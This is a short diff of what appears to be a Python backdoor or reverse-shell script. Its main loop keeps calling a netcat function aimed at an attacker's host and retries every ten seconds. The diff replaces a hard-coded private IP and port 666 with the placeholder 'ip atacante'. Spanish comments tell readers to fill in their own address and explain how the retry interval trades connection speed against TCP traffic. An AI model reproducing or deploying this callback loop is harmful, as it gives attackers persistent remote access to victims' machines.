@@ -17,6 +17,6 @@ def netcat(hostname, port):
 
 while True:
 	try:
-		netcat('192.168.0.106', 666)
+		netcat('ip atacante', port) # sustituyan prros .-.
 	except:
-		sleep(10)
+		sleep(10) # contra mas segundos mas tardara en entablar la primera conexion pero menos trafico tcp generará
